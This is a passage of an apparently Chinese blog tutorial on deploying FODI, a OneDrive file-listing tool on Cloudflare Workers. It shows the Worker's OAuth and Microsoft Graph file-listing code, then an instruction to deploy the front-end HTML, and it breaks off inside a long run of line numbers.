body[<span class="string">&#x27;?path&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> files = <span class="keyword">await</span> <span class="title function_">fetchFiles</span>(requestPath, <span class="literal">null</span>, body.<span class="property">passwd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(files, &#123;</span><br><span class="line">      <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json; charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> event.<span class="title function_">respondWith</span>(<span class="title function_">handleRequest</span>(event.<span class="property">request</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> clientId = [</span><br><span class="line">  <span class="string">&#x27;4da3e7f2-bf6d-467c-aaf0-578078f0bf7c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;04c3ca0b-8d07-4773-85ad-98b037d25631&#x27;</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> clientSecret = [</span><br><span class="line">  <span class="string">&#x27;7/+ykq2xkfx:.DWjacuIRojIaaWL0QI6&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;h8@B7kFVOmj0+8HKBWeNTgl@pU/z4yLB&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> oauthHost = [</span><br><span class="line">  <span class="string">&#x27;https://login.microsoftonline.com&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://login.partner.microsoftonline.cn&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> apiHost = [</span><br><span class="line">  <span class="string">&#x27;https://graph.microsoft.com&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://microsoftgraph.chinacloudapi.cn&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">OAUTH</span> = &#123;</span><br><span class="line">  <span class="string">&#x27;redirectUri&#x27;</span>: <span class="string">&#x27;https://scfonedrive.github.io&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;refreshToken&#x27;</span>: <span class="variable constant_">ONEDRIVE_REFRESHTOKEN</span>,</span><br><span class="line">  <span class="string">&#x27;clientId&#x27;</span>: clientId[<span class="variable constant_">IS_CN</span>],</span><br><span class="line">  <span class="string">&#x27;clientSecret&#x27;</span>: clientSecret[<span class="variable constant_">IS_CN</span>],</span><br><span class="line">  <span class="string">&#x27;oauthUrl&#x27;</span>: oauthHost[<span class="variable constant_">IS_CN</span>] + <span class="string">&#x27;/common/oauth2/v2.0/&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;apiUrl&#x27;</span>: apiHost[<span class="variable constant_">IS_CN</span>] + <span class="string">&#x27;/v1.0/me/drive/root&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;scope&#x27;</span>: apiHost[<span class="variable constant_">IS_CN</span>] + <span class="string">&#x27;/Files.ReadWrite.All offline_access&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">gatherResponse</span>(<span class="params">response</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; headers &#125; = response</span><br><span class="line">  <span class="keyword">const</span> contentType = headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (contentType.<span class="title function_">includes</span>(<span class="string">&#x27;application/json&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> response.<span class="title function_">json</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (contentType.<span class="title function_">includes</span>(<span class="string">&#x27;application/text&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (contentType.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getContent</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url)</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">gatherResponse</span>(response)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getContentWithHeaders</span>(<span class="params">url, headers</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123; <span class="attr">headers</span>: headers &#125;)</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">gatherResponse</span>(response)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchFormData</span>(<span class="params">url, data</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> formdata = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">      formdata.<span class="title function_">append</span>(key, data[key])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> requestOptions = &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">body</span>: formdata</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, requestOptions)</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">gatherResponse</span>(response)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAccessToken</span>(<span class="params"></span>) &#123;</span><br><span class="line">  url = <span class="variable constant_">OAUTH</span>[<span class="string">&#x27;oauthUrl&#x27;</span>] + <span class="string">&#x27;token&#x27;</span></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&#x27;client_id&#x27;</span>: <span class="variable constant_">OAUTH</span>[<span class="string">&#x27;clientId&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;client_secret&#x27;</span>: <span class="variable constant_">OAUTH</span>[<span class="string">&#x27;clientSecret&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;grant_type&#x27;</span>: <span class="string">&#x27;refresh_token&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;requested_token_use&#x27;</span>: <span class="string">&#x27;on_behalf_of&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;refresh_token&#x27;</span>: <span class="variable constant_">OAUTH</span>[<span class="string">&#x27;refreshToken&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">fetchFormData</span>(url, data)</span><br><span class="line">  <span class="keyword">return</span> result.<span class="property">access_token</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchFiles</span>(<span class="params">path, fileName, passwd</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!path || path === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">EXPOSE_PATH</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">      path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      path = <span class="string">&#x27;:&#x27;</span> + <span class="variable constant_">EXPOSE_PATH</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">EXPOSE_PATH</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">      path = <span class="string">&#x27;:&#x27;</span> + path</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      path = <span class="string">&#x27;:&#x27;</span> + <span class="variable constant_">EXPOSE_PATH</span> + path</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> accessToken = <span class="keyword">await</span> <span class="title function_">fetchAccessToken</span>()</span><br><span class="line">  <span class="keyword">const</span> uri = <span class="variable constant_">OAUTH</span>.<span class="property">apiUrl</span> + <span class="built_in">encodeURI</span>(path) + <span class="string">&#x27;?expand=children(select=name,size,parentReference,lastModifiedDateTime,@microsoft.graph.downloadUrl)&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> body = <span class="keyword">await</span> <span class="title function_">getContentWithHeaders</span>(uri, &#123;</span><br><span class="line">    <span class="title class_">Authorization</span>: <span class="string">&#x27;Bearer &#x27;</span> + accessToken</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (fileName) &#123;</span><br><span class="line">    <span class="keyword">let</span> thisFile = <span class="literal">null</span></span><br><span class="line">    body.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (file.<span class="property">name</span> === <span class="built_in">decodeURIComponent</span>(fileName)) &#123;</span><br><span class="line">        thisFile = file[<span class="string">&#x27;@microsoft.graph.downloadUrl&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> thisFile</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> files = []</span><br><span class="line">    <span class="keyword">let</span> encrypted = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; body.<span class="property">children</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> file = body.<span class="property">children</span>[i]</span><br><span class="line">      <span class="keyword">if</span> (file.<span class="property">name</span> === <span class="string">&#x27;.password&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">PASSWD</span> = <span class="keyword">await</span> <span class="title function_">getContent</span>(file[<span class="string">&#x27;@microsoft.graph.downloadUrl&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">PASSWD</span> !== passwd) &#123;</span><br><span class="line">          encrypted = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      files.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: file.<span class="property">name</span>,</span><br><span class="line">        <span class="attr">size</span>: file.<span class="property">size</span>,</span><br><span class="line">        <span class="attr">time</span>: file.<span class="property">lastModifiedDateTime</span>,</span><br><span class="line">        <span class="attr">url</span>: file[<span class="string">&#x27;@microsoft.graph.downloadUrl&#x27;</span>]</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> parent</span><br><span class="line">    <span class="keyword">if</span> (body.<span class="property">children</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      parent = body.<span class="property">children</span>[<span class="number">0</span>].<span class="property">parentReference</span>.<span class="property">path</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      parent = body.<span class="property">parentReference</span>.<span class="property">path</span></span><br><span class="line">    &#125;</span><br><span class="line">    parent = parent.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>).<span class="title function_">pop</span>().<span class="title function_">replace</span>(<span class="variable constant_">EXPOSE_PATH</span>, <span class="string">&#x27;&#x27;</span>) || <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    parent = <span class="built_in">decodeURIComponent</span>(parent)</span><br><span class="line">    <span class="keyword">if</span> (encrypted) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">parent</span>: parent, <span class="attr">files</span>: [], <span class="attr">encrypted</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">parent</span>: parent, <span class="attr">files</span>: files &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，我们打开<a href="https://github.com/vcheckzen/FODI/blob/master/front-end/index.html">官方给的html文件</a>，将自己的workers链接贴到对应的位置，部署到github即可！</p><p>html文件备份：（可以直接复制）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span 